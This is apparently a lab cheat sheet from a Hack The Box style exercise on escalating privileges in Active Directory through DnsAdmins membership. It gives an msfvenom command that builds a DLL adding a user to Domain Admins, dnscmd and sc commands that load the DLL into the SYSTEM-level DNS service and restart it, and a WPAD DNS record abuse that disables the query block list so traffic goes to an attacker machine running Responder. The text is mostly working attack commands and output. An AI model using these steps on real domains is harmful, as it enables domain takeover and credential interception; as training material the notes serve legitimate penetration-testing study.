This group has the right to load dll and make the dns service run them, BTW dns service is running as `NT Authority/ SYSTEM` so we are admins on DC that contain the DNS. we may add new member in AD or get reverse shell.

---

Create DLL
```sh
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll # add our user to domain admins
```

loading Custom DLL
```powershell
# We must specify the full path to our custom DLL or the attack will not work.
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll 
```
Only the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.

By default `dns admin` doesn't have the right to restart the dns service, but in companies its common to find that dns admin have this right. So its worth checking if he has the right to do so.
```powershell
C:\htb> wmic useraccount where name="netadm" get sid
SID
S-1-5-21-669053619-2741956077-1013132368-1109

C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)


C:\htb> sc stop dns
C:\htb> sc start dns

# you are now in domain admins, but you can't see that using whoami /group because your current token isn't updated so ask for a new one.
runas /user:INLANEFREIGHT\netadm powershell
```


---

## WPAD Record Abuse
Run `responder`,

To set up this attack, we first disabled the global query block list:
```powershell-session
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

Next, we add a WPAD record pointing to our attack machine.
```powershell-session
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```